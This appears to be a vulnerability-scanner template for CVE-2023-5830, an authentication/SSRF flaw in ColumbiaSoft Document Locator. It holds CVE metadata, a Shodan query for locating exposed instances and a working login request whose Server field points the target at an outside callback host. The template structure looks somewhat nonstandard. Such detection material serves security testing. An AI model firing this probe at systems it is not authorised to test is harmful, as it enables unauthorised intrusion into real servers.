id: CVE-2023-5830
info:
  name: ColumbiaSoft DocumentLocator - Improper Authentication
  author: Gonski
  description: 'Instances of ColumbiaSoft''s Document Locator prior to version 7.2
    SP4 and 2021.1 are vulnerable to an Improper Authentication/SSRF vulnerability.
    This template identifies vulnerable instances of the ColumbiaSoft Document Locater
    application by confirming external DNS interaction/lookups by modifying the value
    of the client-side SERVER parameter at /api/authentication/login.

    '
  severity: critical
  impact: 'An attacker could exploit this vulnerability to gain unauthorized access
    to sensitive information.

    '
  remediation: 'Upgrade to a patched version of ColumbiaSoft DocumentLocator to fix
    the improper authentication issue.

    '
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2023-5830
  - https://vuldb.com/?ctiid.243729
  - https://github.com/advisories/GHSA-j89v-wm7x-4434
  - https://vuldb.com/?id.243729
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-5830
    cwe-id: CWE-287
    epss-score: 0.00427
    epss-percentile: 0.73911
    cpe: cpe:2.3:a:documentlocator:document_locator:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: documentlocator
    product: document_locator
    shodan-query: title:"Document Locator - WebTools"
  tags: cve,cve2023,ssrf,unauth,columbiasoft,intrusive,webtools
traps:
- request:
    method: POST
    path: /api/authentication/login
    headers:
      Content-Type: application/json;charset=UTF-8
      Origin: '{{BaseURL}}'
      Referer: '{{BaseURL}}'
    body: "{\r\n  \"LoginType\":\"differentWindows\",\r\n  \"User\":\"{{randstr}}\"\
      ,\r\n  \"Password\":\"{{rand_base(5, \"abc\")}}\",\r\n  \"Domain\":\"{{randstr}}\"\
      ,\r\n  \"Server\":\"{{interactsh-url}}\",\r\n  \"Repository\":\"{{randstr}}\"\
      \r\n}"
  response:
    status_code: 200
    headers: {}
    body: '"Authorized":false'
